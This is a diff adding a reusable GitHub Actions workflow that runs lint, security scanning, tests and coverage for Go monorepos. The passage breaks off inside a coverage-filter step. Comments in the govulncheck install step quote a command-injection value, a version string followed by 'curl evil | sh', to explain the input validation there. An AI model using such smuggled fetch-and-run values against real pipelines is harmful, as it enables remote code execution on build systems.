@@ -1,0 +1,1544 @@
+name: "Go PR Analysis"
+
+# Reusable workflow for Go PR analysis in monorepos
+# Handles change detection, CI, security, and coverage checks per changed app
+# All logic is centralized here for easy maintenance
+
+on:
+  workflow_call:
+    outputs:
+      checks_passed:
+        description: >-
+          'true' when no analysis job failed or was cancelled. Every ANALYSIS
+          job counts — Lint, Security, Tests, Coverage, Build, Integration Tests,
+          Custom Checks and Test Determinism — so none of them is excluded. The
+          two jobs outside that set, no-changes and notify, report on the run
+          rather than on the code. Skipped counts as passed: most jobs are
+          conditional on the file types in the diff and on the enable_* flags, so
+          requiring success from all of them would never be satisfied. Exists so
+          a caller can gate on the analysis itself rather than on this workflow's
+          own result, which also folds in jobs that are not analysis — Notify,
+          for one, whose failure to reach Slack says nothing about the code and
+          should not withhold a gate from a green pipeline. A missing
+          SLACK_WEBHOOK_URL is not that case: the notification skips itself and
+          the job succeeds.
+        value: ${{ jobs.results.outputs.checks_passed }}
+    inputs:
+      runner_type:
+        description: 'GitHub runner type'
+        type: string
+        default: 'blacksmith-4vcpu-ubuntu-2404'
+      lint_runner_type:
+        description: 'Optional runner override for the Lint jobs only. Empty = vars.GENERAL_RUNNERS, then runner_type.'
+        type: string
+        default: ''
+      test_runner_type:
+        description: 'Optional runner override for the Tests jobs only. Empty = vars.GENERAL_RUNNERS, then runner_type.'
+        type: string
+        default: ''
+      integration_test_runner_type:
+        description: 'Optional runner override for the Integration Tests jobs only. Empty = vars.GENERAL_RUNNERS, then runner_type.'
+        type: string
+        default: ''
+      coverage_runner_type:
+        description: 'Optional runner override for the Coverage jobs only. Empty = vars.GENERAL_RUNNERS, then runner_type.'
+        type: string
+        default: ''
+      build_runner_type:
+        description: 'Optional runner override for the Build jobs only. Empty = vars.GENERAL_RUNNERS, then runner_type.'
+        type: string
+        default: ''
+      filter_paths:
+        description: 'JSON array of paths to monitor for changes (e.g., ["apps/api", "apps/worker"]). If empty, treats repo as single-app and runs against root directory.'
+        type: string
+        required: false
+        default: ''
+      shared_paths:
+        description: 'Newline-separated (or JSON array) path patterns that, when changed, trigger analysis for ALL components in filter_paths.'
+        type: string
+        required: false
+        default: ''
+      path_level:
+        description: 'Directory depth level to extract app name'
+        type: number
+        default: 2
+      normalize_to_filter:
+        description: 'Collapse every changed file under a filter_paths entry into that one component (working_dir = the filter itself), instead of the path_level-trimmed directory. Default true: without it, a change deeper than path_level segments inside a filtered component (e.g. "apps/dict/components/hub/api/services/command/x.go" under the filter "apps/dict/components/hub/api") spawns a bogus matrix entry rooted at that subdirectory, where no Makefile and no testable package exist — so no coverage.txt is produced, the upload finds no file, and the coverage job fails with "Artifact not found". Mirrors the same input in frontend-pr-analysis.yml.'
+        type: boolean
+        default: true
+      app_name_prefix:
+        description: 'Prefix for app names in matrix output'
+        type: string
+        default: ''
+      app_name_overrides:
+        description: >-
+          Newline-separated "path:name" mappings that name a leg explicitly instead of by its
+          second path segment. path is the leg working_dir (the filter_paths entry while
+          normalize_to_filter is true); app_name_prefix still applies; "path:" gives the prefix alone.
+          Use when several filter_paths entries share a second segment and would collide on one name
+          and one coverage artifact.
+        type: string
+        default: ''
+      go_version:
+        description: 'Go version to use'
+        type: string
+        default: '1.23'
+      golangci_lint_version:
+        description: 'GolangCI-Lint version'
+        type: string
+        default: 'v1.62.2'
+      govulncheck_version:
+        description: >-
+          govulncheck version to install, as a Go module query. Pinned rather than `@latest` so that
+          an upstream release cannot change what this workflow runs without anyone here choosing it:
+          golang.org/x/vuln v1.8.0 raised its own `go` directive to 1.26.0 and broke every Go
+          repository on this channel the day it landed, because the install step has no
+          `continue-on-error` to soften it. The install itself runs under GOTOOLCHAIN=auto, so this
+          default works at any go_version — it does NOT have to track it.
+        type: string
+        default: 'v1.7.0'
+      golangci_lint_args:
+        description: 'Additional arguments for golangci-lint'
+        type: string
+        default: '--timeout=5m'
+      coverage_threshold:
+        description: 'Minimum coverage percentage required (0-100)'
+        type: number
+        default: 80
+      fail_on_coverage_threshold:
+        description: 'Fail the workflow if coverage is below threshold'
+        type: boolean
+        default: true
+      enable_lint:
+        description: 'Enable GolangCI-Lint'
+        type: boolean
+        default: true
+      enable_security:
+        description: 'Enable security scanning (gosec, govulncheck)'
+        type: boolean
+        default: true
+      fail_on_govulncheck:
+        description: >-
+          Fail the Security job when govulncheck reports findings. Default false preserves the
+          advisory behaviour this step has always had: the Go vulnerability database changes
+          independently of the pull request, so a newly published CVE in a common dependency would
+          otherwise turn every repository on this channel red at once, on pull requests that touch
+          nothing related. Findings are reported either way — as a warning annotation when false, as
+          an error when true — so the scan is never silent. Turn it on per repository once its
+          dependency graph is clean.
+        type: boolean
+        default: false
+      enable_tests:
+        description: 'Enable unit tests'
+        type: boolean
+        default: true
+      enable_coverage:
+        description: 'Enable coverage check with PR comment'
+        type: boolean
+        default: true
+      enable_build:
+        description: 'Enable build verification'
+        type: boolean
+        default: true
+      go_private_modules:
+        description: 'GOPRIVATE pattern for private Go modules (e.g., github.com/LerianStudio/*)'
+        type: string
+        default: ''
+      enable_integration_tests:
+        description: 'Enable integration tests (requires make test-integration target)'
+        type: boolean
+        default: false
+      integration_test_command:
+        description: 'Command to run integration tests'
+        type: string
+        default: 'make test-integration'
+      integration_tests_config:
+        description: >-
+          JSON configuring everything the integration lane needs beyond the command
+          itself. Optional keys:
+            service   — {image, ports, health_cmd, health_timeout, env} for a backing
+                        container (database, broker) started on the runner.
+            test_env  — environment variables exported to the test step, typically the
+                        connection string the suite reads.
+            guard     — {packages, pattern}: packages that MUST report a pass, so a
+                        suite that skipped itself fails instead of reporting green.
+          Unknown keys are rejected. Empty keeps today's serviceless, unguarded job.
+        type: string
+        default: ''
+      enable_test_determinism:
+        description: 'Enable test determinism check (runs tests multiple times with shuffle)'
+        type: boolean
+        default: false
+      test_determinism_runs:
+        description: 'Number of times to run tests for determinism check'
+        type: number
+        default: 3
+      enable_custom_checks:
+        description: 'Enable arbitrary caller-owned checks beyond the named gates above (runs each target in custom_checks). Mirrors the same input in frontend-pr-analysis.yml.'
+        type: boolean
+        default: false
+      enable_slack_notification:
+        description: 'Send the analysis verdict to Slack. Set to false in repositories without SLACK_WEBHOOK_URL to skip the job entirely instead of running it just to skip internally.'
+        type: boolean
+        default: true
+      custom_checks:
+        description: 'Newline-separated Makefile targets to run as additional checks (e.g. repo-specific static guards). Each runs independently via `make <target>`; a non-zero exit on any of them fails the job. Use for gates the named jobs do not cover, so a repo does not need its own parallel workflow file.'
+        type: string
+        default: ''
+      system_packages:
+        description: 'Space-separated list of apt packages to install before running Go commands (e.g., "libxml2-dev pkg-config"). Required for CGO repositories that depend on native system libraries.'
+        type: string
+        required: false
+        default: ''
+    secrets:
+      MANAGE_TOKEN:
+        description: Token for private module access and PR operations. Falls back to GITHUB_TOKEN where a job can work without it.
+        required: false
+      SLACK_WEBHOOK_URL:
+        description: Slack webhook for pipeline notifications. Absent disables the notification, it does not fail the job.
+        required: false
+
+# Floor for every job: reading the code is all most of them need. Jobs that run
+# code from the pull request get nothing else, so a caller can keep granting the
+# write scopes the Security and Coverage jobs below require without handing them
+# to a Makefile target. A reusable workflow can only narrow what the caller
+# granted, never widen it, so raising a job here still needs the caller's grant.
+permissions:
+  contents: read
+
+jobs:
+  # ============================================
+  # CHANGE DETECTION
+  # ============================================
+  detect-changes:
+    name: Detect Changes
+    runs-on: ${{ vars.GENERAL_RUNNERS || inputs.runner_type }}
+    outputs:
+      matrix: ${{ steps.changed-paths.outputs.matrix }}
+      has_changes: ${{ steps.changed-paths.outputs.has_changes }}
+    steps:
+      - name: Get changed paths
+        id: changed-paths
+        uses: LerianStudio/shared-workflows-public/src/config/changed-paths@v1
+        with:
+          filter-paths: ${{ inputs.filter_paths }}
+          shared-paths: ${{ inputs.shared_paths }}
+          path-level: ${{ inputs.path_level }}
+          get-app-name: 'true'
+          app-name-prefix: ${{ inputs.app_name_prefix }}
+          app-name-overrides: ${{ inputs.app_name_overrides }}
+          normalize-to-filter: ${{ inputs.normalize_to_filter }}
+          fallback-app-name: ${{ inputs.app_name_prefix != '' && inputs.app_name_prefix || 'app' }}
+
+  # ============================================
+  # GOLANGCI-LINT
+  # ============================================
+  lint:
+    name: Lint (${{ matrix.app.name }})
+    needs: detect-changes
+    if: needs.detect-changes.outputs.has_changes == 'true' && inputs.enable_lint
+    runs-on: ${{ inputs.lint_runner_type || vars.GENERAL_RUNNERS || inputs.runner_type }}
+    strategy:
+      fail-fast: false
+      matrix:
+        app: ${{ fromJson(needs.detect-changes.outputs.matrix) }}
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v6
+
+      - name: Install system dependencies
+        if: inputs.system_packages != ''
+        env:
+          SYSTEM_PACKAGES: ${{ inputs.system_packages }}
+        run: |
+          mapfile -t PACKAGES < <(printf '%s' "$SYSTEM_PACKAGES" | tr -s '[:space:]' '\n' | grep -v '^[[:space:]]*$')
+          if [[ ${#PACKAGES[@]} -eq 0 ]]; then
+            echo "::notice::No valid package names in system_packages; skipping."
+            exit 0
+          fi
+          for pkg in "${PACKAGES[@]}"; do
+            if [[ "$pkg" == -* ]] || [[ ! "$pkg" =~ ^[A-Za-z0-9][A-Za-z0-9.+:-]*$ ]]; then
+              echo "::error::Invalid apt package token: '$pkg'"
+              exit 1
+            fi
+          done
+          sudo DEBIAN_FRONTEND=noninteractive apt-get update -qq
+          sudo DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends "${PACKAGES[@]}"
+
+      - name: Setup Go
+        uses: actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e # v6
+        with:
+          go-version: ${{ inputs.go_version }}
+          cache: true
+
+      # An org secret the calling repository has not been granted resolves to an
+      # empty string, not an error. Fail here, naming it, instead of letting a
+      # later step fail obscurely or skip and report success. Fork and Dependabot
+      # runs are left out: GitHub withholds Actions secrets from them by design.
+      - name: Require secrets
+        if: inputs.go_private_modules != '' && github.event.pull_request.head.repo.fork != true && github.actor != 'dependabot[bot]'
+        shell: bash
+        env:
+          MANAGE_TOKEN: ${{ secrets.MANAGE_TOKEN }}
+        run: |
+          set -euo pipefail
+          required=(MANAGE_TOKEN)
+          missing=()
+          for name in "${required[@]}"; do
+            [[ -n "${!name:-}" ]] || missing+=("$name")
+          done
+          if (( ${#missing[@]} > 0 )); then
+            echo "::error::Empty secret(s): ${missing[*]}. Set them on the calling repository or grant it access to the organization secret."
+            exit 1
+          fi
+
+      # Credential-confined prefetch: the token lives only inside the composite
+      # step, which deletes it before any code from the pull request runs. See
+      # src/setup/go-private-modules/README.md.
+      - name: Fetch private Go modules
+        if: inputs.go_private_modules != ''
+        uses: LerianStudio/shared-workflows-public/src/setup/go-private-modules@v1
+        with:
+          go-private-modules: ${{ inputs.go_private_modules }}
+          manage-token: ${{ secrets.MANAGE_TOKEN }}
+          working-dir: ${{ matrix.app.working_dir }}
+
+      - name: Install golangci-lint
+        env:
+          GOLANGCI_LINT_VERSION: ${{ inputs.golangci_lint_version }}
+        run: |
+          if [[ ! "$GOLANGCI_LINT_VERSION" =~ ^v([0-9]+)\.[0-9]+\.[0-9]+$ ]]; then
+            echo "::error::Invalid golangci-lint version: $GOLANGCI_LINT_VERSION (expected format vMAJOR.MINOR.PATCH)"
+            exit 1
+          fi
+          MAJOR="${BASH_REMATCH[1]}"
+          if [[ "$MAJOR" -ge 2 ]]; then
+            MODULE_PATH="github.com/golangci/golangci-lint/v${MAJOR}/cmd/golangci-lint"
+          else
+            MODULE_PATH="github.com/golangci/golangci-lint/cmd/golangci-lint"
+          fi
+          go install "${MODULE_PATH}@${GOLANGCI_LINT_VERSION}"
+          echo "$(go env GOPATH)/bin" >> "$GITHUB_PATH"
+
+      - name: Detect Makefile lint target
+        id: detect-make
+        working-directory: ${{ matrix.app.working_dir }}
+        run: |
+          if [[ -f "Makefile" ]] || [[ -f "makefile" ]] || [[ -f "GNUmakefile" ]]; then
+            if make -n lint >/dev/null 2>&1; then
+              echo "Makefile with 'lint' target detected"
+              echo "use_make=true" >> "$GITHUB_OUTPUT"
+            else
+              echo "Makefile exists but no 'lint' target found"
+              echo "use_make=false" >> "$GITHUB_OUTPUT"
+            fi
+          else
+            echo "No Makefile found"
+            echo "use_make=false" >> "$GITHUB_OUTPUT"
+          fi
+
+      - name: Run GolangCI-Lint (make)
+        if: steps.detect-make.outputs.use_make == 'true'
+        working-directory: ${{ matrix.app.working_dir }}
+        run: make lint
+
+      - name: Run GolangCI-Lint (direct)
+        if: steps.detect-make.outputs.use_make != 'true'
+        working-directory: ${{ matrix.app.working_dir }}
+        env:
+          GOLANGCI_LINT_ARGS: ${{ inputs.golangci_lint_args }}
+        run: |
+          read -ra golangci_args <<< "$GOLANGCI_LINT_ARGS"
+          golangci-lint run "${golangci_args[@]}"
+
+  # ============================================
+  # SECURITY SCANNING
+  # ============================================
+  security:
+    name: Security (${{ matrix.app.name }})
+    # Uploading SARIF writes a code-scanning alert; actions: read lets the
+    # upload resolve the run it belongs to on private repositories.
+    permissions:
+      contents: read
+      actions: read
+      security-events: write
+    needs: detect-changes
+    if: needs.detect-changes.outputs.has_changes == 'true' && inputs.enable_security
+    runs-on: ${{ vars.GENERAL_RUNNERS || inputs.runner_type }}
+    strategy:
+      fail-fast: false
+      matrix:
+        app: ${{ fromJson(needs.detect-changes.outputs.matrix) }}
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v6
+
+      - name: Install system dependencies
+        if: inputs.system_packages != ''
+        env:
+          SYSTEM_PACKAGES: ${{ inputs.system_packages }}
+        run: |
+          mapfile -t PACKAGES < <(printf '%s' "$SYSTEM_PACKAGES" | tr -s '[:space:]' '\n' | grep -v '^[[:space:]]*$')
+          if [[ ${#PACKAGES[@]} -eq 0 ]]; then
+            echo "::notice::No valid package names in system_packages; skipping."
+            exit 0
+          fi
+          for pkg in "${PACKAGES[@]}"; do
+            if [[ "$pkg" == -* ]] || [[ ! "$pkg" =~ ^[A-Za-z0-9][A-Za-z0-9.+:-]*$ ]]; then
+              echo "::error::Invalid apt package token: '$pkg'"
+              exit 1
+            fi
+          done
+          sudo DEBIAN_FRONTEND=noninteractive apt-get update -qq
+          sudo DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends "${PACKAGES[@]}"
+
+      - name: Setup Go
+        uses: actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e # v6
+        with:
+          go-version: ${{ inputs.go_version }}
+          cache: true
+
+      # An org secret the calling repository has not been granted resolves to an
+      # empty string, not an error. Fail here, naming it, instead of letting a
+      # later step fail obscurely or skip and report success. Fork and Dependabot
+      # runs are left out: GitHub withholds Actions secrets from them by design.
+      - name: Require secrets
+        if: inputs.go_private_modules != '' && github.event.pull_request.head.repo.fork != true && github.actor != 'dependabot[bot]'
+        shell: bash
+        env:
+          MANAGE_TOKEN: ${{ secrets.MANAGE_TOKEN }}
+        run: |
+          set -euo pipefail
+          required=(MANAGE_TOKEN)
+          missing=()
+          for name in "${required[@]}"; do
+            [[ -n "${!name:-}" ]] || missing+=("$name")
+          done
+          if (( ${#missing[@]} > 0 )); then
+            echo "::error::Empty secret(s): ${missing[*]}. Set them on the calling repository or grant it access to the organization secret."
+            exit 1
+          fi
+
+      # Credential-confined prefetch: the token lives only inside the composite
+      # step, which deletes it before any code from the pull request runs. See
+      # src/setup/go-private-modules/README.md.
+      - name: Fetch private Go modules
+        if: inputs.go_private_modules != ''
+        uses: LerianStudio/shared-workflows-public/src/setup/go-private-modules@v1
+        with:
+          go-private-modules: ${{ inputs.go_private_modules }}
+          manage-token: ${{ secrets.MANAGE_TOKEN }}
+          working-dir: ${{ matrix.app.working_dir }}
+
+      - name: Detect Makefile sec target
+        id: detect-make
+        working-directory: ${{ matrix.app.working_dir }}
+        run: |
+          if [[ -f "Makefile" ]] || [[ -f "makefile" ]] || [[ -f "GNUmakefile" ]]; then
+            if ! command -v gosec >/dev/null 2>&1; then
+              echo "Makefile present but gosec is not on PATH; skipping 'make sec' (the gosec action below is authoritative)"
+              echo "use_make=false" >> "$GITHUB_OUTPUT"
+            elif make -n sec >/dev/null 2>&1; then
+              echo "Makefile with 'sec' target detected"
+              echo "use_make=true" >> "$GITHUB_OUTPUT"
+            else
+              echo "Makefile exists but no 'sec' target found"
+              echo "use_make=false" >> "$GITHUB_OUTPUT"
+            fi
+          else
+            echo "No Makefile found"
+            echo "use_make=false" >> "$GITHUB_OUTPUT"
+          fi
+
+      - name: Run Security (make)
+        if: steps.detect-make.outputs.use_make == 'true'
+        working-directory: ${{ matrix.app.working_dir }}
+        run: make sec
+        continue-on-error: true
+
+      - name: Run Gosec for SARIF
+        id: gosec-sarif
+        uses: securego/gosec@deb54465fea23d19a77f037e11e6589021f8501d # v2.29.0
+        with:
+          args: -no-fail -fmt sarif -out gosec-${{ matrix.app.name }}.sarif ./${{ matrix.app.working_dir }}/...
+
+      - name: Upload Gosec SARIF
+        if: always()
+        uses: github/codeql-action/upload-sarif@6f2ac81f5cd81fe351a197ba0b00d91d03cd2aee # v4.39.0
+        with:
+          sarif_file: gosec-${{ matrix.app.name }}.sarif
+          category: gosec-${{ matrix.app.name }}
+        continue-on-error: true
+
+      - name: Install govulncheck
+        env:
+          # actions/setup-go exports GOTOOLCHAIN=local for the whole job, so `go install` of a tool
+          # whose own `go` directive is newer than go_version REFUSES instead of upgrading. That is
+          # right for the scan (it must analyse under the pinned toolchain) and wrong for BUILDING
+          # the scanner, so the override is scoped to this step alone.
+          GOTOOLCHAIN: auto
+          # Never interpolated into the script body: `${{ }}` is substituted BEFORE the shell sees
+          # the line, so a caller passing `v1.7.0; curl evil|sh` would be running commands, not
+          # naming a version. As an env var it is data the shell expands, and the check below bounds
+          # it to a module query even if a caller forwards something untrusted into this input.
+          GOVULNCHECK_VERSION: ${{ inputs.govulncheck_version }}
+        run: |
+          # CHARSET FIRST, SHAPE SECOND, and in that order for a reason. A shape glob alone accepts
+          # "v1.7.0; curl evil | sh" — its trailing * swallows the payload — and `grep -E` matches
+          # LINE BY LINE, so a value whose first line is "v1.7.0" passes whatever follows the
+          # newline. `case` tests the whole string at once, so rejecting every character outside
+          # the module-query set closes both holes before the shape is considered.
+          case "$GOVULNCHECK_VERSION" in
+            *[!0-9A-Za-z.+_-]*)           bad=1 ;;
+            latest|v[0-9]*.[0-9]*.[0-9]*) bad=  ;;
+            *)                            bad=1 ;;
+          esac
+          if [ -n "$bad" ]; then
+            echo "::error::govulncheck_version must be 'latest' or a vX.Y.Z module query, got '$GOVULNCHECK_VERSION'"
+            exit 1
+          fi
+          go install "golang.org/x/vuln/cmd/govulncheck@$GOVULNCHECK_VERSION"
+
+      - name: Run govulncheck
+        working-directory: ${{ matrix.app.working_dir }}
+        env:
+          # Data, not script: substituted into the environment, never into the line the shell parses.
+          FAIL_ON_FINDINGS: ${{ inputs.fail_on_govulncheck }}
+          APP_NAME: ${{ matrix.app.name }}
+        # A bare `continue-on-error: true` swallowed the result entirely — the finding stayed in the
+        # job log, which nobody opens on a green check. Branching on the exit code instead reports it
+        # as an annotation in both modes, and lets a caller that has cleaned its graph gate on it.
+        run: |
+          if govulncheck ./...; then
+            exit 0
+          fi
+          if [ "$FAIL_ON_FINDINGS" = "true" ]; then
+            echo "::error::govulncheck reported findings for $APP_NAME"
+            exit 1
+          fi
+          echo "::warning::govulncheck reported findings for $APP_NAME (advisory: fail_on_govulncheck is false)"
+
+  # ============================================
+  # UNIT TESTS
+  # ============================================
+  tests:
+    name: Tests (${{ matrix.app.name }})
+    needs: detect-changes
+    if: needs.detect-changes.outputs.has_changes == 'true' && inputs.enable_tests
+    runs-on: ${{ inputs.test_runner_type || vars.GENERAL_RUNNERS || inputs.runner_type }}
+    strategy:
+      fail-fast: false
+      matrix:
+        app: ${{ fromJson(needs.detect-changes.outputs.matrix) }}
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v6
+
+      - name: Install system dependencies
+        if: inputs.system_packages != ''
+        env:
+          SYSTEM_PACKAGES: ${{ inputs.system_packages }}
+        run: |
+          mapfile -t PACKAGES < <(printf '%s' "$SYSTEM_PACKAGES" | tr -s '[:space:]' '\n' | grep -v '^[[:space:]]*$')
+          if [[ ${#PACKAGES[@]} -eq 0 ]]; then
+            echo "::notice::No valid package names in system_packages; skipping."
+            exit 0
+          fi
+          for pkg in "${PACKAGES[@]}"; do
+            if [[ "$pkg" == -* ]] || [[ ! "$pkg" =~ ^[A-Za-z0-9][A-Za-z0-9.+:-]*$ ]]; then
+              echo "::error::Invalid apt package token: '$pkg'"
+              exit 1
+            fi
+          done
+          sudo DEBIAN_FRONTEND=noninteractive apt-get update -qq
+          sudo DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends "${PACKAGES[@]}"
+
+      - name: Setup Go
+        uses: actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e # v6
+        with:
+          go-version: ${{ inputs.go_version }}
+          cache: true
+
+      # An org secret the calling repository has not been granted resolves to an
+      # empty string, not an error. Fail here, naming it, instead of letting a
+      # later step fail obscurely or skip and report success. Fork and Dependabot
+      # runs are left out: GitHub withholds Actions secrets from them by design.
+      - name: Require secrets
+        if: inputs.go_private_modules != '' && github.event.pull_request.head.repo.fork != true && github.actor != 'dependabot[bot]'
+        shell: bash
+        env:
+          MANAGE_TOKEN: ${{ secrets.MANAGE_TOKEN }}
+        run: |
+          set -euo pipefail
+          required=(MANAGE_TOKEN)
+          missing=()
+          for name in "${required[@]}"; do
+            [[ -n "${!name:-}" ]] || missing+=("$name")
+          done
+          if (( ${#missing[@]} > 0 )); then
+            echo "::error::Empty secret(s): ${missing[*]}. Set them on the calling repository or grant it access to the organization secret."
+            exit 1
+          fi
+
+      # Credential-confined prefetch: the token lives only inside the composite
+      # step, which deletes it before any code from the pull request runs. See
+      # src/setup/go-private-modules/README.md.
+      - name: Fetch private Go modules
+        if: inputs.go_private_modules != ''
+        uses: LerianStudio/shared-workflows-public/src/setup/go-private-modules@v1
+        with:
+          go-private-modules: ${{ inputs.go_private_modules }}
+          manage-token: ${{ secrets.MANAGE_TOKEN }}
+          working-dir: ${{ matrix.app.working_dir }}
+
+      - name: Detect Makefile test target
+        id: detect-make
+        working-directory: ${{ matrix.app.working_dir }}
+        run: |
+          # Look for Makefile targets that generate coverage
+          # Priority: coverage-unit > cover-html > test (no coverage)
+          if [[ -f "Makefile" ]] || [[ -f "makefile" ]] || [[ -f "GNUmakefile" ]]; then
+            if make -n coverage-unit >/dev/null 2>&1; then
+              echo "Makefile with 'coverage-unit' target detected"
+              {
+                echo "use_make=true"
+                echo "make_target=coverage-unit"
+              } >> "$GITHUB_OUTPUT"
+            elif make -n cover-html >/dev/null 2>&1; then
+              echo "Makefile with 'cover-html' target detected"
+              {
+                echo "use_make=true"
+                echo "make_target=cover-html"
+              } >> "$GITHUB_OUTPUT"
+            elif make -n test >/dev/null 2>&1; then
+              echo "Makefile with 'test' target detected (no coverage)"
+              {
+                echo "use_make=true"
+                echo "make_target=test"
+                echo "no_coverage=true"
+              } >> "$GITHUB_OUTPUT"
+            else
+              echo "No test targets found in Makefile, using go test"
+              echo "use_make=false" >> "$GITHUB_OUTPUT"
+            fi
+          else
+            echo "No Makefile found, using go test"
+            echo "use_make=false" >> "$GITHUB_OUTPUT"
+          fi
+
+      - name: Download dependencies
+        if: steps.detect-make.outputs.use_make != 'true'
+        working-directory: ${{ matrix.app.working_dir }}
+        run: go mod download
+
+      - name: Run tests (make)
+        if: steps.detect-make.outputs.use_make == 'true'
+        working-directory: ${{ matrix.app.working_dir }}
+        env:
+          CGO_ENABLED: 1
+          MAKE_TARGET: ${{ steps.detect-make.outputs.make_target }}
+        run: |
+          make "$MAKE_TARGET"
+          # Normalize coverage file name for downstream jobs
+          # Check various locations where coverage might be generated
+          if [[ -f "coverage.out" ]] && [[ ! -f "coverage.txt" ]]; then
+            cp coverage.out coverage.txt
+          fi
+          if [[ -f "reports/unit_coverage.out" ]] && [[ ! -f "coverage.txt" ]]; then
+            cp reports/unit_coverage.out coverage.txt
+          fi
+          if [[ -f "artifacts/coverage.out" ]] && [[ ! -f "coverage.txt" ]]; then
+            cp artifacts/coverage.out coverage.txt
+          fi
+          if [[ -f "artifacts/coverage-unit.out" ]] && [[ ! -f "coverage.txt" ]]; then
+            cp artifacts/coverage-unit.out coverage.txt
+          fi
+
+      - name: Generate coverage (fallback for make test)
+        if: steps.detect-make.outputs.use_make == 'true' && steps.detect-make.outputs.no_coverage == 'true'
+        working-directory: ${{ matrix.app.working_dir }}
+        env:
+          CGO_ENABLED: 1
+        run: |
+          # make test ran but doesn't generate coverage, run go test for coverage only
+          echo "Generating coverage with go test (make test doesn't generate coverage)"
+
+          # Get package list, excluding /tests/ and /api/ directories (standard exclusions)
+          PACKAGES=$(go list ./... | awk '!/\/tests($|\/)/' | awk '!/\/api($|\/)/')
+
+          if [[ -n "$PACKAGES" ]]; then
+            echo "$PACKAGES" | xargs go test -coverprofile=coverage.txt -covermode=atomic > /dev/null 2>&1 || true
+          else
+            go test -coverprofile=coverage.txt -covermode=atomic ./... > /dev/null 2>&1 || true
+          fi
+
+      - name: Run tests (go)
+        if: steps.detect-make.outputs.use_make != 'true'
+        working-directory: ${{ matrix.app.working_dir }}
+        env:
+          CGO_ENABLED: 1
+        run: |
+          # Get package list, excluding /tests/ and /api/ directories (standard exclusions)
+          # .ignorecoverunit patterns are applied to the coverage REPORT, not to test execution
+          PACKAGES=$(go list ./... | awk '!/\/tests($|\/)/' | awk '!/\/api($|\/)/')
+
+          if [[ -z "$PACKAGES" ]]; then
+            echo "No packages found after filtering /tests/ and /api/"
+            exit 0
+          fi
+
+          PACKAGE_COUNT=$(echo "$PACKAGES" | wc -l | tr -d ' ')
+          echo "Running tests on $PACKAGE_COUNT packages (excluded /tests/, /api/)"
+          echo "$PACKAGES" | xargs go test -v -race -coverprofile=coverage.txt -covermode=atomic
+
+      # OpenAPI spec drift gate (opt-in, auto-detected — same make -n probe style
+      # as "Detect Makefile test target" above).
+      # Probes exactly ONE target: check-api-spec, the canonical opt-in name. If it
+      #   exists it runs as a HARD GATE — a stale committed OpenAPI spec fails the job.
+      #   No such target (or no Makefile) => one log line and succeed.
+      # Only check-api-spec is probed, on purpose. Boilerplate-standard names such as
+      #   check-generated-artifacts and validate-api-docs are NOT probed: they exist in
+      #   many org repos with divergent, unverified bodies (swag-family targets that
+      #   exit 1 when swag is absent, which this job does not install), so auto-adopting
+      #   them would break PRs org-wide the moment the shared-workflow ref bumps. A repo
+      #   opts in by exposing check-api-spec — aliasing its own verified check into it.
+      - name: OpenAPI spec drift gate
+        working-directory: ${{ matrix.app.working_dir }}
+        run: |
+          if [[ -f "Makefile" ]] || [[ -f "makefile" ]] || [[ -f "GNUmakefile" ]]; then
+            if make -n check-api-spec >/dev/null 2>&1; then
+              echo "OpenAPI drift gate: running 'check-api-spec'"
+              make check-api-spec
+            else
+              echo "no OpenAPI drift-gate target found — skipping; add check-api-spec to opt in"
+            fi
+          else
+            echo "No Makefile found — skipping OpenAPI drift gate"
+          fi
+
+      - name: Upload coverage artifact
+        uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7
+        with:
+          name: coverage-${{ matrix.app.name }}
+          path: ${{ matrix.app.working_dir }}/coverage.txt
+          retention-days: 7
+
+  # ============================================
+  # COVERAGE CHECK
+  # ============================================
+  coverage:
+    name: Coverage (${{ matrix.app.name }})
+    # Posts the coverage comment on the pull request. This job reads the test
+    # artifact and the coverage profile; it never runs code from the branch.
+    permissions:
+      contents: read
+      pull-requests: write
+    needs: [detect-changes, tests]
+    if: needs.detect-changes.outputs.has_changes == 'true' && inputs.enable_coverage
+    runs-on: ${{ inputs.coverage_runner_type || vars.GENERAL_RUNNERS || inputs.runner_type }}
+    strategy:
+      fail-fast: false
+      matrix:
+        app: ${{ fromJson(needs.detect-changes.outputs.matrix) }}
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v6
+
+      - name: Setup Go
+        uses: actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e # v6
+        with:
+          go-version: ${{ inputs.go_version }}
+          cache: true
+
+      - name: Download coverage artifact
+        uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8
+        with:
+          name: coverage-${{ matrix.app.name }}
+          path: ${{ matrix.app.working_dir }}
+
+      - name: Filter coverage with .ignorecoverunit
+        working-directory: ${{ matrix.app.working_dir }}
+        run: |
+          if [[ ! -f coverage.txt ]]; then
+            echo "No coverage.txt file found, skipping filter"
+            exit 0
+          fi
+
+          # Check for .ignorecoverunit in working dir first, then repository root
+          IGNORE_FILE=""
+          if [[ -f .ignorecoverunit ]]; then
+            IGNORE_FILE=".ignorecoverunit"
+            echo "Using .ignorecoverunit from working directory"
+          elif [[ -f "$GITHUB_WORKSPACE/.ignorecoverunit" ]]; then
+            IGNORE_FILE="$GITHUB_WORKSPACE/.ignorecoverunit"
+            echo "Using .ignorecoverunit from repository root"
+          else
+            # No repo-provided file — fall back to the shared module default so
+            # common non-unit-testable paths (mocks, cmd/bootstrap, generated
+            # API docs, e2e suites, testutil) are excluded out of the box.
+            # A repo opts out by committing an empty .ignorecoverunit.
+            IGNORE_FILE="$RUNNER_TEMP/.ignorecoverunit.default"
+            cat > "$IGNORE_FILE" <<'DEFAULT_IGNORECOVERUNIT'
+          # Auto-generated mocks
+          *_mock.go
+
+          # Bootstrap / entrypoints
+          /bootstrap/
+          /cmd/
+          bootstrap.go
+
